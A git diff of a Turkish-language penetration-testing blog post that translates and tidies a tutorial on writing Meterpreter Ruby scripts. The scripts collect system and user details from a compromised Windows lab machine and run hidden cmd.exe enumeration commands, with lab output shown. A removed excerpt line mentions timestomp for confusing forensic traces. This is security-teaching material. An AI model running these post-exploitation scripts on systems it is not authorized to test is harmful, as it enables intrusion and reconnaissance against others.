@@ -5,7 +5,7 @@ date: 2017-06-14 09:02:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -16,12 +16,12 @@ tags:
 - Metasploit Framework timestomp
 - msf meterpreter timestomp
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için "Hello World" ruby kodu yazalım,
 ---
 
 # Script Yazma
 
-Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için "Hello World" ruby kodu yazalım ve ```helloworld.rb``` olarak ```/usr/share/metasploit-framework/scripts/meterpreter``` klaösrüne kayıt edelim.
+Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için "Hello World" ruby kodu yazalım ve ```helloworld.rb``` olarak ```/usr/share/metasploit-framework/scripts/meterpreter``` klasörüne kayıt edelim.
 
 ```sh
 root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
@@ -35,7 +35,7 @@ meterpreter > run helloworld
 meterpreter >
 ```
 
-Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise ibr kaç API çağrısını ```helloworld.rb``` dosyamızın içine ekleyelim. Aşağıdaki satırları metin editör kullanarak ekleyebilirsiniz.
+Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını ```helloworld.rb``` dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.
 
 ```sh
 print_error(“this is an error!”)
@@ -73,9 +73,9 @@ print_line("This is a line")
  end
 ```
 
-Bu yapıyı oluşturmak için 
-The use of functions allows us to make our code modular and more re-usable. This error handling will aid us in the troubleshooting of our scripts, so using some of the API calls we covered previously, we could build a function that looks like this:
+Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra ```helloworld.rb``` dosyamızın içeriği aşağıdaki gibi olacaktır.
 
+```sh
  def getinfo(session)
     begin
        sysnfo = session.sys.config.sysinfo
@@ -88,24 +88,16 @@ The use of functions allows us to make our code modular and more re-usable. This
        print_error("The following error was encountered #{e}")
     end
  end
+```
+
+Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri ```session``` değişkeninden alan ```getinfo(session)``` isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir. ```sysnfo = session.sys.config.sysinfo``` satırı sistem bilgisini getirirken ```runpriv = session.sys.config.getuid``` kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.
 
 
-Let’s break down what we are doing here. We define a function named getinfo which takes one paramater that we are placing in a local variable named ‘session’. This variable has a couple methods that are called on it to extract system and user information, after which we print a couple of status lines that report the findings from the methods. In some cases, the information we are printing comes out from a hash, so we have to be sure to call the variable correctly. We also have an error handler placed in there that will return what ever error message we might encounter.
+# helloworld2.rb
 
-Now that we have this function, we just have to call it and give it the Meterpreter client session. To call it, we just place the following at the end of our script:
+İlk oluşturduğumuz dosyaya ufak bir ilave yaparak ```helloworld2.rb``` dosyası üretelim. ```helloworld2.rb``` dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı ```helloworld2.rb``` olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.
 
-getinfo(client)
-Now we execute the script and we can see the output of it:
-
- meterpreter > run helloworld2
- [*] Getting system information ...
- [*]     The target machine OS is Windows XP (Build 2600, Service Pack 3).
- [*]     The computer name is Computer
- [*]     Script running as WINXPVM01labuser
- 
-
-helloworld2.rb
-
+```sh
  def getinfo(session)
     begin
        sysnfo = session.sys.config.sysinfo
@@ -118,19 +110,35 @@ helloworld2.rb
        print_error("The following error was encountered #{e}")
     end
  end
- 
- 
- getinfo(client)
-As you can see, these very simple steps build up to give us the basics for creating advanced Meterpreter scripts. Let’s expand on this script to gather more information on our target. Let’s create another function for executing commands and printing their output:
 
- def list_exec(session,cmdlst)
+ getinfo(client)
+```
+
+Şimdi hazırladığımız ```helloworld2.rb``` dosyamızı Meterpreter oturumunda çalıştıralım.
+
+```sh
+ meterpreter > run helloworld2
+ [*] Getting system information ...
+ [*]     The target machine OS is Windows XP (Build 2600, Service Pack 3).
+ [*]     The computer name is Computer
+ [*]     Script running as WINXPVM01labuser
+```
+
+Gördüğünüz gibi ```helloworld2.rb``` scripti ile bir takım sistem bigilerini ele etmiş olduk.
+
+# helloworld3.rb
+
+Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.
+
+```sh
+def list_exec(session,cmdlst)
     print_status("Running Command List ...")
     r=''
     session.response_timeout=120
     cmdlst.each do |cmd|
        begin
-          print_status "trunning command #{cmd}"
-          r = session.sys.process.execute(“cmd.exe /c #{cmd}”, nil, {'Hidden' => true, 'Channelized' => true})
+          print_status "running command #{cmd}"
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
           while(d = r.channel.read)
  
              print_status("t#{d}")
@@ -142,18 +150,29 @@ As you can see, these very simple steps build up to give us the basics for creat
        end
     end
  end
-Again, lets break down what we are doing here. We define a function that takes two paramaters, the second of which will be a array. A timeout is also established so that the function does not hang on us. We then set up a “for each” loop that runs on the array that is passed to the function which will take each item in the array and execute it on the system through cmd.exe /c, printing the status that is returned from the command execution. Finally, an error handler is established to capture any issues that come up while executing the function.
+ 
+ commands = [ "set",
+    "ipconfig  /all",
+    "arp -a"]
+ 
+ list_exec(client,commands)
+```
 
-Now we set an array of commands for enumerating the target host:
+Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, ```list_exec``` isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, ```session``` ve ```cmdlist``` isimli iki değişken almaktadır. ```cmdlist``` değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak ```cmd.exe``` üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için ```session.response_timeout=120``` 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.
 
+```cmdlist``` dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.
+
+```sh
  commands = [ “set”,
     “ipconfig  /all”,
     “arp –a”]
-and then call it with the command
+```
 
-list_exec(client,commands)
-With that in place, when we run it we get:
+Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı ```list_exec(client,commands)``` bulunmaktadır.
 
+Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.
+
+```sh
  meterpreter > run helloworld3
  [*] Running Command List ...
  [*]     running command set
@@ -220,34 +239,7 @@ With that in place, when we run it we get:
  172.16.104.150        00-0c-29-a7-f1-c5     dynamic   
  
  meterpreter >
- 
+```
 
-helloworld3.rb
-
- def list_exec(session,cmdlst)
-    print_status("Running Command List ...")
-    r=''
-    session.response_timeout=120
-    cmdlst.each do |cmd|
-       begin
-          print_status "running command #{cmd}"
-          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
-          while(d = r.channel.read)
- 
-             print_status("t#{d}")
-          end
-          r.channel.close
-          r.close
-       rescue ::Exception => e
-          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
-       end
-    end
- end
- 
- commands = [ "set",
-    "ipconfig  /all",
-    "arp -a"]
- 
- list_exec(client,commands)
-As you can see, creating custom Meterpreter scripts is not difficult if you take it one step at a time, building upon itself. Just remember to frequently test, and refer back to the source on how various API calls operate.
+Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.
 
